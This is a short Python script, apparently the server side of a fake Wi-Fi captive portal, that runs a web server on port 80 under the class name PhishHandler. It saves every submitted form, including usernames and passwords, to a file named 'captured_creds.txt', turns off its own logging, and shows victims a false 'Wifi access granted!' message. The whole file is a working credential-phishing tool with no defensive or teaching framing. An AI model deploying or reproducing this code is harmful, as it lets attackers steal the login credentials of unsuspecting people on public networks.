from http.server import SimpleHTTPRequestHandler, HTTPServer
import urllib.parse

class PhishHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        post = self.rfile.read(length).decode("utf-8")
        creds = urllib.parse.parse_qs(post)
        with open("captured_creds.txt", "a") as f:
            f.write(str(creds) + "\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<html><body><h3>Wifi access granted!</h3><p>You are now connected.</p></body></html>")
    def log_message(self, *args): pass  # Suppress logging

if __name__ == '__main__':
    import os; os.chdir(os.path.dirname(__file__))
    HTTPServer(('', 80), PhishHandler).serve_forever()
